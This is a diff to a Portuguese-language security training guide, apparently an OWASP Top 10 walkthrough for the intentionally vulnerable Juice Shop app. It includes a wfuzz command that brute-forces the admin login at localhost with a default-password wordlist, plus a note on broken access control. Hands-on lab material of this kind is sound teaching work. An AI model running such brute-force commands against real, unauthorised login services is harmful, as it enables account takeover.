@@ -158,11 +158,13 @@ Um ataque de força bruta no login é um método em que softwares automatizados 
 
 https://github.com/danielmiessler/SecLists 
 
-- [ ] Acesse a área de administrador descoberta na inspeção de código main.js.
+- [ ] Exemplo de descoberta de senha via shell utilizando wordlists do Kali
 
 ```
 wfuzz -c -w /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op","password":"FUZZ"}' --sc 200 http://localhost:3000/rest/user/login
 ```
+- [ ] Acesse a área de administrador descoberta na inspeção de código "main.js".
+      
 ## 7° Broken Access Control
 
 A exploração de falhas no controle de acesso é uma habilidade fundamental dos atacantes. Ferramentas de SAST e DAST (Burp Suite, Zed Attack Proxy) conseguem detectar a ausência de controle de acesso, mas não conseguem verificar se ele é funcional quando está presente. O controle de acesso pode ser detectado por meios manuais ou, possivelmente, por meio de automação para identificar a ausência de controles em determinados frameworks.
